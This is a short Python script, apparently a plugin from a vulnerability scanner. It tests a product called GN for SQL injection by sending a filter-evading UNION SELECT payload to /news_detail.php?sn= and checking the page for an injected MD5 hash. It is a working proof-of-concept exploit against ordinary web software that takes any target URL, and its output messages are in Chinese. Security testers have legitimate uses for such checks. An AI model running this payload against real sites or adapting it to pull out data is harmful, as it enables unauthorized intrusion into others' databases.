#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: GN SQL Injection
referer: unknown
author: Lucifer
description: GN SQL injection。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class gn_consulting_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/news_detail.php?sn=-7%27+/*!50000UnIoN*/+SeLeCt+1,2,3,Md5(1234),5,6,7--%20-"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                printGreen("[+]Success:存在GN SQL Injection漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在gn_consulting_sqli漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = gn_consulting_sqli(sys.argv[1])
    testVuln.run()